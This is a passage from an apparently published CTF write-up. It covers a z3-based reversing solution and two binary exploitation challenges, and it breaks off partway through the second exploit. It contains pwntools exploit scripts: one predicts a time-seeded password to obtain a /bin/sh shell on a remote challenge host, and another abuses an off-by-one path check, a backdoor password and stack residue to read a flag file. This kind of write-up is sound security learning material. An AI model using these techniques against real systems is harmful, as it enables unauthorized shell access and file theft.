<span class="line"><span style="color:#DBD7CAEE">solver</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">add </span><span style="color:#666666">((</span><span style="color:#DBD7CAEE">buf_d</span><span style="color:#666666">[</span><span style="color:#4C9A91">7</span><span style="color:#666666">]</span><span style="color:#CB7676"> *</span><span style="color:#4C9A91"> 7.0</span><span style="color:#666666">)</span><span style="color:#CB7676"> /</span><span style="color:#4C9A91"> 2.0</span><span style="color:#CB7676"> ==</span><span style="color:#DBD7CAEE"> buf_d</span><span style="color:#666666">[</span><span style="color:#4C9A91">7</span><span style="color:#666666">]</span><span style="color:#CB7676"> *</span><span style="color:#4C9A91"> 3.0</span><span style="color:#CB7676"> +</span><span style="color:#4C9A91"> 23.5</span><span style="color:#666666">)</span><span style="color:#DBD7CAEE"> </span></span>
<span class="line"><span style="color:#DBD7CAEE">solver</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">add </span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">buf_d</span><span style="color:#666666">[</span><span style="color:#4C9A91">14</span><span style="color:#666666">]</span><span style="color:#CB7676"> ==</span><span style="color:#DBD7CAEE"> buf_d</span><span style="color:#666666">[</span><span style="color:#4C9A91">14</span><span style="color:#666666">]</span><span style="color:#CB7676"> /</span><span style="color:#4C9A91"> 2.0</span><span style="color:#CB7676"> +</span><span style="color:#4C9A91"> 48.0</span><span style="color:#666666">)</span><span style="color:#DBD7CAEE"> </span></span>
<span class="line"><span style="color:#DBD7CAEE">solver</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">add </span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">buf_d</span><span style="color:#666666">[</span><span style="color:#4C9A91">8</span><span style="color:#666666">]</span><span style="color:#CB7676"> ==</span><span style="color:#4C9A91"> 110.0</span><span style="color:#666666">)</span><span style="color:#DBD7CAEE"> </span></span>
<span class="line"><span style="color:#DBD7CAEE">solver</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">add </span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">buf_d</span><span style="color:#666666">[</span><span style="color:#4C9A91">13</span><span style="color:#666666">]</span><span style="color:#CB7676"> ==</span><span style="color:#DBD7CAEE"> buf_d</span><span style="color:#666666">[</span><span style="color:#4C9A91">14</span><span style="color:#666666">]</span><span style="color:#CB7676"> /</span><span style="color:#4C9A91"> 2.0</span><span style="color:#CB7676"> -</span><span style="color:#4C9A91"> 1.0</span><span style="color:#666666">)</span><span style="color:#DBD7CAEE"> </span></span>
<span class="line"><span style="color:#DBD7CAEE">solver</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">add </span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">buf_d</span><span style="color:#666666">[</span><span style="color:#4C9A91">9</span><span style="color:#666666">]</span><span style="color:#CB7676"> ==</span><span style="color:#4C9A91"> 104.0</span><span style="color:#666666">)</span><span style="color:#DBD7CAEE"> </span></span>
<span class="line"><span style="color:#DBD7CAEE">solver</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">add </span><span style="color:#666666">((</span><span style="color:#DBD7CAEE">buf_d</span><span style="color:#666666">[</span><span style="color:#4C9A91">12</span><span style="color:#666666">]</span><span style="color:#CB7676"> ==</span><span style="color:#DBD7CAEE"> buf_d</span><span style="color:#666666">[</span><span style="color:#4C9A91">11</span><span style="color:#666666">])</span><span style="color:#666666"> ,</span><span style="color:#666666"> (</span><span style="color:#DBD7CAEE">buf_d</span><span style="color:#666666">[</span><span style="color:#4C9A91">11</span><span style="color:#666666">]</span><span style="color:#CB7676"> ==</span><span style="color:#4C9A91"> 108.0</span><span style="color:#666666">))</span><span style="color:#DBD7CAEE"> </span></span>
<span class="line"><span style="color:#DBD7CAEE">solver</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">add </span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">buf_d</span><span style="color:#666666">[</span><span style="color:#4C9A91">10</span><span style="color:#666666">]</span><span style="color:#CB7676"> ==</span><span style="color:#4C9A91"> 48.0</span><span style="color:#666666">)</span><span style="color:#DBD7CAEE"> </span></span>
<span class="line"></span>
<span class="line"><span style="color:#4D9375">assert</span><span style="color:#DBD7CAEE"> solver</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">check</span><span style="color:#666666">()</span><span style="color:#CB7676"> ==</span><span style="color:#DBD7CAEE"> z3</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sat</span></span>
<span class="line"><span style="color:#DBD7CAEE">m </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> solver</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">model</span><span style="color:#666666">()</span></span>
<span class="line"></span>
<span class="line"><span style="color:#DBD7CAEE">word </span><span style="color:#666666">=</span><span style="color:#C98A7D77"> ''</span></span>
<span class="line"><span style="color:#4D9375">for</span><span style="color:#DBD7CAEE"> el </span><span style="color:#4D9375">in</span><span style="color:#DBD7CAEE"> buf_d</span><span style="color:#666666">:</span></span>
<span class="line"><span style="color:#DBD7CAEE">    evaluation </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> m</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">evaluate</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">el</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">    value </span><span style="color:#666666">=</span><span style="color:#B8A965"> round</span><span style="color:#666666">(</span><span style="color:#B8A965">float</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">evaluation</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">as_fraction</span><span style="color:#666666">()))</span></span>
<span class="line"><span style="color:#DBD7CAEE">    word </span><span style="color:#666666">+=</span><span style="color:#B8A965"> chr</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">value</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">        </span></span>
<span class="line"><span style="color:#B8A965">print</span><span style="color:#666666">(</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">The word is:</span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> word</span><span style="color:#666666">)</span></span>
<span class="line"></span></code></pre>
<p>Our script returned the string <code>wBHC6,r/nh0ll/`[-1[_,,hy</code> that actually is accepted by the binary that returns the message <code>Word found! But it's not the flag. Awww :3</code>.
Now we have to undestand where the right flag is.
From the decompiled, we can see how, after the checks, the strings are used and altered in some way. Unfortunately, neither ghidra and IDA decompile this part in an acceptable way.
We decided to try a dynamic approach. Since the binary calls a ptrace, it is needed to patch the code and avoid the tracing before running the challenge with gdb. Performed this step, it is pretty easy to see how each character of the word is incremented by 4.
Hence, the final string is the actual flag.</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#DBD7CAEE">flag </span><span style="color:#666666">=</span><span style="color:#C98A7D77"> ''</span></span>
<span class="line"><span style="color:#4D9375">for</span><span style="color:#DBD7CAEE"> l </span><span style="color:#4D9375">in</span><span style="color:#DBD7CAEE"> word</span><span style="color:#666666">:</span></span>
<span class="line"><span style="color:#DBD7CAEE">    flag </span><span style="color:#666666">+=</span><span style="color:#B8A965"> chr</span><span style="color:#666666">(</span><span style="color:#B8A965">ord</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">l</span><span style="color:#666666">)</span><span style="color:#CB7676">+</span><span style="color:#4C9A91">4</span><span style="color:#666666">)</span></span>
<span class="line"></span>
<span class="line"><span style="color:#B8A965">print</span><span style="color:#666666">(</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">The flag is:</span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> flag</span><span style="color:#666666">)</span></span>
<span class="line"></span></code></pre>
<p><code>{FLG:0v3rl4pp3d_15_c00l}</code></p>
<h3 id="binary-200">Binary 200</h3>
<p>A Docker container with the challenge is provided. The binary is a <code>Linux 64-bit ELF</code>. We openend it in IDA to reverse engineer it.
When started, the service asks for a password. From IDA, we can recover it.
<code>strcmp(s1, "secret_passwd_anti_bad_guys")</code>
Succesively, he random seed is init to <code>time(0)</code>, and two function are invoked.<br>
From this moment on, for the sake of the writeup, we consider the binary loaded at address <code>0x0</code>.
The first one, <code>sub_13E7</code>, prints some introduction messages, and call the function <code>sub_12F2</code>. There we discover the existence of <code>sub_1245(int n)</code>. It generates a random string of n characters. Each character is generated by taking a random character from the string <code>abcdefghijklmopqrstuvwxyz</code>. It’s done by generating a random index with libc’s <code>rand()</code> function. We notice <code>sub_12F2</code> is invoked 11 times, each time with length 5 as paramater.</p>
<p>The succesively invoked function is the main loop of a game. You insert the string corresponding to a move, and the corresponding function is called. The <code>Help</code> move shows the available moves.</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>    "Help     print help menu"</span></span>
<span class="line"><span>    "Exit     close the connection"</span></span>
<span class="line"><span>    "Jump     move to the next plant"</span></span>
<span class="line"><span>    "GetName  get planet name"</span></span>
<span class="line"><span>    "Rename   rename planet"</span></span>
<span class="line"><span>    "Check    check if you can overflow the stack"</span></span>
<span class="line"><span>    "GoBack   move to the previous planet"</span></span>
<span class="line"><span>    "Search   looking for Zer0"</span></span>
<span class="line"><span>    "Nap      Get a nap"</span></span>
<span class="line"><span>    "Admin    Access as Admin"</span></span>
<span class="line"><span></span></span></code></pre>
<p>The most interesting move is <code>Admin</code>. From the array of function pointers at <code>0x19CE</code>, we open <code>sub_17D3</code>, that is the one associated to <code>Admin</code>. It asks for a secret password of 30 characters ,randomly generated by <code>sub_1245</code>. If it’s correct, <code>sub_1886</code> is invoked, asking for a command (up to 8 characters) to pass to <code>system</code> primitive.</p>
<p>We know that, in program initialization, random seed is intitialized to <code>time(0)</code> and <code>rand</code> function is invoked <code>11 * 5</code> times before the password is generated.
So the attack plan is</p>
<ul>
<li>Open <code>libc</code> in exploit with <code>CDLL</code> python’s library</li>
<li>Open the connection to the service</li>
<li>Immediately call in the exploit <code>libc.srand</code> to set random seed to <code>libc.time(0)</code>. This allows to have locally the same seed used remotely</li>
<li>Generate <code>5 * 11</code> random values, to bring the <code>PRNG</code> state to the same one before passowrd generation</li>
<li>Generate the 30 characters secret password</li>
<li>Use the <code>Admin</code> move</li>
<li>Send the generated password</li>
<li>Call the <code>/bin/sh</code> command</li>
<li>Get the flag!</li>
</ul>
<p>Final exploit</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#4D9375">from</span><span style="color:#DBD7CAEE"> pwn </span><span style="color:#4D9375">import</span><span style="color:#CB7676"> *</span></span>
<span class="line"><span style="color:#4D9375">from</span><span style="color:#DBD7CAEE"> ctypes </span><span style="color:#4D9375">import</span><span style="color:#CB7676"> *</span></span>
<span class="line"></span>
<span class="line"><span style="color:#758575DD"># PWN 200</span></span>
<span class="line"></span>
<span class="line"><span style="color:#C99076">CHARS</span><span style="color:#666666"> =</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">abcdefghijklmnopqrstuvwxyz</span><span style="color:#C98A7D77">"</span></span>
<span class="line"></span>
<span class="line"><span style="color:#CB7676">def</span><span style="color:#80A665"> get_password</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">n</span><span style="color:#666666">):</span></span>
<span class="line"><span style="color:#DBD7CAEE">    password </span><span style="color:#666666">=</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">""</span></span>
<span class="line"><span style="color:#4D9375">    for</span><span style="color:#DBD7CAEE"> i </span><span style="color:#4D9375">in</span><span style="color:#B8A965"> range</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">n</span><span style="color:#666666">):</span></span>
<span class="line"><span style="color:#DBD7CAEE">        password </span><span style="color:#666666">+=</span><span style="color:#C99076"> CHARS</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">libc</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">rand</span><span style="color:#666666">()</span><span style="color:#CB7676"> %</span><span style="color:#4C9A91"> 26</span><span style="color:#666666">].</span><span style="color:#DBD7CAEE">to_bytes</span><span style="color:#666666">(</span><span style="color:#4C9A91">1</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">little</span><span style="color:#C98A7D77">"</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#4D9375">    return</span><span style="color:#DBD7CAEE"> password</span></span>
<span class="line"></span>
<span class="line"><span style="color:#758575DD"># TLDR: Seed can be guessed very easily given that it is initialize with time(0)</span></span>
<span class="line"></span>
<span class="line"><span style="color:#758575DD"># c = process("./challs")</span></span>
<span class="line"><span style="color:#DBD7CAEE">c </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> remote</span><span style="color:#666666">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">gamebox3.reply.it</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 2692</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">libc </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> CDLL</span><span style="color:#666666">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">libc.so.6</span><span style="color:#C98A7D77">"</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">libc</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">srand</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">libc</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">time</span><span style="color:#666666">(</span><span style="color:#4C9A91">0</span><span style="color:#666666">))</span></span>
<span class="line"></span>
<span class="line"><span style="color:#DBD7CAEE">c</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#666666">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">Passwd: </span><span style="color:#C98A7D77">"</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">c</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendline</span><span style="color:#666666">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">secret_passwd_anti_bad_guys</span><span style="color:#C98A7D77">"</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">c</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#666666">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">></span><span style="color:#C98A7D77">"</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">c</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendline</span><span style="color:#666666">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">Admin</span><span style="color:#C98A7D77">"</span><span style="color:#666666">)</span></span>
<span class="line"></span>
<span class="line"><span style="color:#4D9375">for</span><span style="color:#DBD7CAEE"> i </span><span style="color:#4D9375">in</span><span style="color:#B8A965"> range</span><span style="color:#666666">(</span><span style="color:#4C9A91">5</span><span style="color:#CB7676"> *</span><span style="color:#4C9A91"> 11</span><span style="color:#666666">):</span></span>
<span class="line"><span style="color:#DBD7CAEE">    libc</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">rand</span><span style="color:#666666">()</span></span>
<span class="line"></span>
<span class="line"><span style="color:#DBD7CAEE">password </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> get_password</span><span style="color:#666666">(</span><span style="color:#4C9A91">30</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#B8A965">print</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">password</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#B8A965">print</span><span style="color:#666666">(</span><span style="color:#B8A965">len</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">password</span><span style="color:#666666">))</span></span>
<span class="line"></span>
<span class="line"><span style="color:#DBD7CAEE">c</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendline</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">password</span><span style="color:#666666">)</span></span>
<span class="line"></span>
<span class="line"><span style="color:#DBD7CAEE">c</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">interactive</span><span style="color:#666666">()</span></span>
<span class="line"></span></code></pre>
<h3 id="binary-300">Binary 300</h3>
<p>A Docker container is provided with this challenge. Looking at Dockerfile and start.sh files, the service bin/challenge is exposed on the network when the container is started.</p>
<p>So, after understanding that <code>challenge</code> is a Linux ELF 64-bit binary, we opened it in IDA to reverse engineer it.</p>
<p>When the main function is called, the service asks for a password (easily recoverable from the <code>check_password</code>function, and it’s <code>ae86b59869f0806b5f53b_be20c200469a9a0ebfdbbe4__</code>). We are now asked for an input. With input <code>8</code>, we are able to print a menu of functions.</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>Options:</span></span>
<span class="line"><span>1. Create secret</span></span>
<span class="line"><span>2. Delete secret</span></span>
<span class="line"><span>3. Show secret</span></span>
<span class="line"><span>4. List secrets</span></span>
<span class="line"><span>5. Change codes</span></span>
<span class="line"><span>6. Change password</span></span>
<span class="line"><span>7. Show codes</span></span>
<span class="line"><span>8. Help</span></span>
<span class="line"><span>9. Exit</span></span>
<span class="line"><span></span></span></code></pre>
<p>From this moment on, for the sake of the writeup, we consider the binary’s base address <code>0x0</code></p>
<p>Some global variables discovered during the analysis, and that will be used further in this writeup are:</p>
<ul>
<li><code>aTmpSecret1</code>: the address of the first element of an array of strings, from this moment on called <code>secretsPath</code>; it’s located at <code>0xC010</code></li>
<li><code>code1</code> and <code>code2</code>, two <code>32-bit</code> integers located respectively at <code>0xC040</code> and <code>0xC048</code></li>
</ul>
<p>A recurrent function that is called during the execution is <code>get_secret_dir</code>. It  asks for a secret number <code>num</code>, such that <code>0 &#x3C; num &#x3C;= 3</code> (out of this range, <code>num</code> is set to 1). Then, it returns the pointer to the <code>num - 1</code>-th element of <code>secretPath</code> array.</p>
<ol>
<li>
<p>Create secret: <br>
First of all, the function <code>get_secret_dir</code> is called. Than user is prompted for a <code>password</code> and a <code>message</code>. At the end, it creates the secret on the filename returned by <code>get_secret_dir</code>. The content written on the file can be retrieved from this function invocation.
<code>fprintf(stream, "%s%s%p%p\n", password, message, (const void *)code1, (const void *)code2);</code> \</p>
</li>
<li>
<p>Delete secret: <br>
Through <code>get_secret_dir</code> retrieves the number of the secret to delete, and delete the corresponding file using <code>unlink(filename)</code></p>
</li>
<li>
<p>Show secret: <br>
It asks for a preuth key</p>
<ul>
<li>If it’s provided <code>0x13371337</code>, it asks for a secret number following the same assignment logic of <code>get_secret_dir</code> function</li>
<li>If it’s provided <code>0xdeadbeef</code>, the secret number is set to 1.</li>
</ul>
<p>Than, it tries to open the corresponding secret file, asks for the password, and if it’s correct, it prints the content of the chosen secret.</p>
</li>
<li>
<p>List secrets: <br>
This option checks for the existence of each file in the <code>secretPath</code> array, and prints out the filename of existing files.</p>
</li>
<li>
<p>Change codes: <br>
Allows you to change the content of <code>code1</code> and <code>code2</code> variables, and to call <code>Show secret function</code>, if answer to question prompt is <code>y</code>. You are allowed to change <code>code1</code> and <code>code2</code> only by providing 0x13371337 pre-auth key; it’s prompted only if you negatively answer to also call <code>Show Secrets</code></p>
</li>
<li>
<p>Change password: <br>
Not available option, since it just prints <code>#TODO</code></p>
</li>
<li>
<p>Show codes: <br>
<code>printf("code1:%p code2:%p\n", (const void *)code1, (const void *)code2);</code><br>
it just prints in hexadecimal format the content of <code>code1</code> and <code>code2</code> global variables.</p>
</li>
</ol>
<p>While deepely reverse engineering each function, we found some interesting facts:</p>
<ul>
<li>in <code>show_secrets</code> function, when checking the file password, function <code>sub_19D9(input_password, file_password)</code> is called. It returns <code>True</code> either if it’s entered the corret password of the file, or the backdoor password <code>Wild BackD00r appeared!</code></li>
<li>in <code>show_secrets</code> function, the secret number validation is broken;<br>
<code>if ( num > 0 &#x26;&#x26; num &#x3C;= 4 &#x26;&#x26; (--num, filename = &#x26;aTmpSecret1[16 * num], (stream = fopen(filename, "r")) != 0LL)</code> <br>
previously allowed values for secret number were <code>1,2,3</code>, while here also 4 is accepted. Moreover, the filename that will be opened is <code>&#x26;aTmpSecret1[16 * num]</code>. Since <code>&#x26;aTmpSecret1</code> is 0xC010, with num == 4 we access to 0xc040, that is the address of <code>code1</code>. We have control of it!</li>
</ul>
<p>So, to get the flag, the attack plan is:</p>
<ul>
<li>Call <code>Change code</code> function, and set code1 and code2 to some numbers that, as string, will be interpreted as flag file path (from Dockerfile, binary is launched from /home/ctf directoty, and from there relative path to the flag is <code>home/flag.txt</code>). To do this, we set code1 to <code>7020098272914927464</code>, and code2 to <code>500237086311</code>. In fact,</li>
</ul>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#4D9375">from</span><span style="color:#DBD7CAEE"> pwn </span><span style="color:#4D9375">import</span><span style="color:#CB7676"> *</span></span>
<span class="line"></span>
<span class="line"><span style="color:#DBD7CAEE">In </span><span style="color:#666666">[</span><span style="color:#4C9A91">4</span><span style="color:#666666">]:</span><span style="color:#DBD7CAEE"> p64</span><span style="color:#666666">(</span><span style="color:#4C9A91">7020098272914927464</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">Out</span><span style="color:#666666">[</span><span style="color:#4C9A91">4</span><span style="color:#666666">]:</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">home/fla</span><span style="color:#C98A7D77">'</span></span>
<span class="line"></span>
<span class="line"><span style="color:#DBD7CAEE">In </span><span style="color:#666666">[</span><span style="color:#4C9A91">5</span><span style="color:#666666">]:</span><span style="color:#DBD7CAEE"> p64</span><span style="color:#666666">(</span><span style="color:#4C9A91">500237086311</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">Out</span><span style="color:#666666">[</span><span style="color:#4C9A91">5</span><span style="color:#666666">]:</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">g.txt</span><span style="color:#C99076">\x00\x00\x00</span><span style="color:#C98A7D77">'</span></span>
<span class="line"></span>
<span class="line"></span></code></pre>
<ul>
<li>
<p>Call <code>Show Secrets</code> with preauthkey 0 and any password. This is needed to set the variable holding the <code>preauthkey</code> to 0, so that each primitive is invoked with <code>preauthkey</code> 0 (different to <code>0xdeadbeef</code> or <code>0x13371337</code>).</p>
</li>
<li>
<p>Call<code>Change Codes</code>, allowing to successively call <code>Show Secrets</code>.</p>
<ul>
<li><code>Change Codes</code> will be called with <code>preauthkey</code> 0, that was set by the previous call to <code>Show Secrets</code></li>
<li>The input codes will be <code>code1 = b"A" * 31</code> and <code>code2 = b"B" * 28 + b"\x04\x00\x00"</code>. This allows to dirt the stack frame of the successive call to <code>Show Secrets</code>. In particular, the input for <code>code2</code> allows to have secret number 4 when calling <code>Show Secrets</code>. Pay attention that codes won’t be changed, since <code>preauthkey</code> is not 0x13371337, leaving <code>home/flag.txt</code> as content of <code>code1</code> and <code>code2</code></li>
<li>when <code>Show Secrets</code> is invoked, no secret number is asked, since <code>preauthkey</code> is set to 0, and the value will be <code>4</code>. The provided password is the backdoor one.</li>
</ul>
</li>
</ul>
<p>The last invocation to <code>Show Secrets</code> openend the file flag.txt, the check for password was bypassed with backdoor password, and we got the flag!
Final exploit:</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#4D9375">import</span><span style="color:#DBD7CAEE"> string</span></span>
<span class="line"><span style="color:#4D9375">from</span><span style="color:#DBD7CAEE"> pwn </span><span style="color:#4D9375">import</span><span style="color:#CB7676"> *</span></span>
<span class="line"></span>
<span class="line"><span style="color:#CB7676">def</span><span style="color:#80A665"> create_secret</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">secret</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> password</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> msg</span><span style="color:#666666">):</span></span>
<span class="line"><span style="color:#DBD7CAEE">    c</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#666666">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">></span><span style="color:#C98A7D77">'</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">    c</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendline</span><span style="color:#666666">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">1</span><span style="color:#C98A7D77">"</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">    c</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#666666">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">Insert secret (0 &#x3C; index &#x3C; 4):</span><span style="color:#C98A7D77">'</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">    c</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendline</span><span style="color:#666666">(</span><span style="color:#B8A965">str</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">secret</span><span style="color:#666666">).</span><span style="color:#DBD7CAEE">encode</span><span style="color:#666666">())</span></span>
<span class="line"><span style="color:#DBD7CAEE">    c</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#666666">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">Insert password:</span><span style="color:#C98A7D77">'</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">    c</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendline</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">password</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">    c</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#666666">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">Insert msg:</span><span style="color:#C98A7D77">"</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">    c</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendline</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">msg</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">    c</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#666666">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">Secret created</span><span style="color:#C98A7D77">"</span><span style="color:#666666">)</span></span>
<span class="line"></span>
<span class="line"><span style="color:#CB7676">def</span><span style="color:#80A665"> delete_secret</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">secret</span><span style="color:#666666">):</span></span>
<span class="line"><span style="color:#DBD7CAEE">    c</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#666666">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">></span><span style="color:#C98A7D77">'</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">    c</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendline</span><span style="color:#666666">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">2</span><span style="color:#C98A7D77">"</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">    c</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#666666">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">Insert secret (0 &#x3C; index &#x3C; 4):</span><span style="color:#C98A7D77">'</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">    c</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendline</span><span style="color:#666666">(</span><span style="color:#B8A965">str</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">secret</span><span style="color:#666666">).</span><span style="color:#DBD7CAEE">encode</span><span style="color:#666666">())</span></span>
<span class="line"><span style="color:#DBD7CAEE">    c</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#666666">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">Secret deleted</span><span style="color:#C98A7D77">'</span><span style="color:#666666">)</span></span>
<span class="line"></span>
<span class="line"><span style="color:#CB7676">def</span><span style="color:#80A665"> show_secret</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">preauthkey</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> password</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> secret </span><span style="color:#CB7676">=</span><span style="color:#4D9375"> None</span><span style="color:#666666">):</span></span>
<span class="line"><span style="color:#DBD7CAEE">    c</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#666666">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">></span><span style="color:#C98A7D77">'</span><span style="color:#666666">)</span></span>
